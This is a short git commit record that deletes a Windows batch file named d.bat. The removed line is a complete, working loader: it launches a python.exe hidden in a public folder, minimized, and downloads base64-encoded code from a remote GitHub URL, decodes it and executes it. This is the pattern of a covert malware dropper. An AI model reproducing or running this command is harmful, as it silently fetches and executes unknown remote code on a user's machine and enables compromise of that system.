08a756fe0723becfc958adb883307e7f8e9681b9
relatedemai <glenbowman8508@gmail.com>
2024-09-19 23:11:15 -0700

    Delete d.bat

--- d.bat
+++
@@ -1,1 +0,0 @@
-"start "" /min "C:\\Users\\Public\\Document\\python.exe" -c "import urllib.request;import base64;exec(base64.b64decode(urllib.request.urlopen('https://raw.githubusercontent.com/relatedemai/b/main/mv').read().decode('utf-8')))"""
